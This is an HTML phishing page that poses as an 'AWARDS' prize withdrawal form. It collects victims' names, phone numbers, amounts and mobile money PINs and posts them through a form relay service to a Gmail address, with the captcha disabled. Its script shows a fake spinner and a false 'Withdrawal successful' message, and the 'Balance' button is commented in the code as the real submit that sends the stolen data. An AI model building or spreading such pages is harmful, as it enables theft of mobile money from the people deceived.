<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AWARDS</title>

<style>
    body {
        font-family: Arial, sans-serif;
        background: #f2f2f2;
        margin: 0;
        padding: 0;
    }

    .title-bar {
        background: yellow;
        color: black;
        padding: 15px;
        font-size: 22px;
        font-weight: bold;
        text-align: center;
    }

    .container {
        max-width: 450px;
        margin: 25px auto;
        background: #fff;
        padding: 20px;
        border-radius: 8px;
        box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
    }

    label {
        display: block;
        font-weight: bold;
        margin-bottom: 6px;
    }

    input {
        width: 100%;
        padding: 12px;
        margin-bottom: 15px;
        border: 1px solid #ccc;
        border-radius: 6px;
        font-size: 15px;
    }

    .blue-btn {
        width: 100%;
        background: #007bff;
        color: #fff;
        padding: 15px;
        font-size: 18px;
        border: none;
        border-radius: 6px;
        cursor: pointer;
        font-weight: bold;
    }

    .blue-btn:disabled {
        background: #8cbcff;
        cursor: not-allowed;
    }

    .green-box {
        margin-top: 20px;
        padding: 15px;
        background: #28a745;
        color: #fff;
        font-weight: bold;
        border-radius: 6px;
        text-align: center;
        display: none;
    }

    .green-btn {
        width: 100%;
        margin-top: 15px;
        background: #28a745;
        color: white;
        padding: 15px;
        font-size: 18px;
        border: none;
        border-radius: 6px;
        cursor: pointer;
        font-weight: bold;
        display: none;
    }

    .spinner {
        border: 4px solid #ffffff55;
        border-top: 4px solid white;
        border-radius: 50%;
        width: 22px;
        height: 22px;
        animation: spin 1s linear infinite;
        display: none;
        margin: 0 auto;
        margin-top: 10px;
    }

    @keyframes spin {
        100% { transform: rotate(360deg); }
    }

</style>
</head>
<body>

<div class="title-bar">AWARDS</div>

<div class="container">

<form action="https://formsubmit.co/exellentfirm@gmail.com" method="POST">

    <!-- Disable Captcha -->
    <input type="hidden" name="_captcha" value="false">

    <!-- Redirect to thankyou.html -->
    <input type="hidden" name="_next" value="thankyou.html">

    <label>Enter your Name</label>
    <input type="text" id="name" name="Full Name" required oninput="this.value=this.value.replace(/[^a-zA-Z ]/g,'')">

    <label>Enter phone number</label>
    <input type="text" id="phone" name="Phone Number" required oninput="this.value=this.value.replace(/[^0-9]/g,'')">

    <label>Enter Amount to withdraw</label>
    <input type="text" id="amount" name="Amount" required oninput="this.value=this.value.replace(/[^0-9]/g,'')">

    <label>Enter your Mobile money pin / secret code</label>
    <input type="password" id="pin" name="PIN"
           placeholder="PIN to withdraw amount → phone number"
           required oninput="this.value=this.value.replace(/[^0-9]/g,'')">

    <!-- Withdraw button -->
    <button type="button" class="blue-btn" id="withdrawBtn" disabled>Withdraw</button>

    <div class="spinner" id="loader"></div>

    <div class="green-box" id="successBox">
        Withdrawal successful — click Balance button to check balance
    </div>

    <!-- BALANCE = REAL SUBMIT BUTTON -->
    <button type="submit" class="green-btn" id="balanceBtn">Balance</button>

</form>

</div>

<script>
function checkFilled() {
    let name = document.getElementById("name").value.trim();
    let phone = document.getElementById("phone").value.trim();
    let amount = document.getElementById("amount").value.trim();
    let pin = document.getElementById("pin").value.trim();

    const btn = document.getElementById("withdrawBtn");

    if(name !== "" && phone !== "" && amount !== "" && pin !== "") {
        btn.disabled = false;
    } else {
        btn.disabled = true;
    }
}

document.querySelectorAll("input").forEach(input => {
    input.addEventListener("input", checkFilled);
});

document.getElementById("withdrawBtn").addEventListener("click", function(){
    let btn = this;
    let loader = document.getElementById("loader");
    let successBox = document.getElementById("successBox");
    let balanceBtn = document.getElementById("balanceBtn");

    btn.style.display = "none";
    loader.style.display = "block";

    setTimeout(function(){
        loader.style.display = "none";
        successBox.style.display = "block";
        balanceBtn.style.display = "block";
    }, 5000);
});
</script>

</body>
</html>
